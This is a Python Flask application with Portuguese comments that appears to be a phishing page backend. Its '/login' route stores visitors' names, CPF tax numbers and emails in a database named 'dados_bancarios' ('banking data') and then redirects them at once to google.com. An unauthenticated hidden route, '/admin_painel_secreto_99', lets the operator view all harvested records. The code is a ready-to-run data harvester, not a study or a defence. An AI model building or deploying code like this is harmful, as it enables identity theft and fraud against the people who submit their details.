import os
import sqlite3
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

# Função para garantir que a tabela exista ao iniciar
def init_db():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT, 
            cpf TEXT, 
            email TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    # Captura os dados vindos do formulário
    nome = request.form.get('nome')
    cpf = request.form.get('cpf')
    email = request.form.get('email')
    
    # Salva no banco de dados local
    try:
        conn = sqlite3.connect('dados_bancarios.db')
        cursor = conn.cursor()
        cursor.execute('INSERT INTO usuarios (nome, cpf, email) VALUES (?, ?, ?)', 
                       (nome, cpf, email))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro ao salvar: {e}")

    # Redirecionamento instantâneo
    return redirect("https://www.google.com")

# Seu acesso ao Painel ADM
@app.route('/admin_painel_secreto_99')
def admin():
    try:
        conn = sqlite3.connect('dados_bancarios.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
        usuarios = cursor.fetchall()
        conn.close()
        return render_template('admin.html', usuarios=usuarios)
    except Exception as e:
        return f"Erro ao acessar painel: {e}"

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)





